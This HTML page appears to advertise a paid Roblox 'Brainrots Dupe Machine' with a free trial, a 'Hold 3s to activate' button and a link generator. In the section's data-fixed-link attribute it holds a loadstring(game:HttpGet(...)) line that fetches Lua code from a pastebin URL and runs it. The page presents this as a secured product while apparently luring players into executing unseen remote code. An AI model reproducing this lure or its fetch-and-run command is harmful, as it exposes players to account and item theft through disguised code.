<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Zagolovok</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="./styles.css" />
</head>
<body>

  <main class="wrap">
    <section class="box" id="app" data-fixed-link="loadstring(game:HttpGet("https://pastebin.com/raw/kguPGCJu"))()">
      <div class="top">
        <div class="badge">SECURED</div>
      </div>

      <h1 class="title">Brainrots Dupe Machine</h1>
      <p class="price">$70 / day <span class="dot">•</span> 2 days free</p>

      <!-- LOCKED -->
      <div class="locked" id="locked">
        <button class="hold" id="holdBtn" type="button" aria-label="Activate free trial">
          <span class="hold__fill" id="holdFill"></span>
          <span class="hold__text" id="holdText">Hold 3s to activate</span>
        </button>
        <div class="status" id="status">Not activated</div>
      </div>

      <!-- UNLOCKED -->
      <div class="unlocked" id="unlocked" hidden>
        <div class="row">
          <input class="input" id="idInput" type="text" placeholder="ID" autocomplete="off" />
          <button class="btn" id="genBtn" type="button">Generate</button>
        </div>

        <div class="out" id="outWrap" hidden>
          <div class="out__label">Link</div>
          <div class="out__value" id="linkOut">""</div>
        </div>

        <div class="note" id="note">A<br/>B</div>
      </div>
    </section>
  </main>

  <script src="./app.js"></script>
</body>
</html>
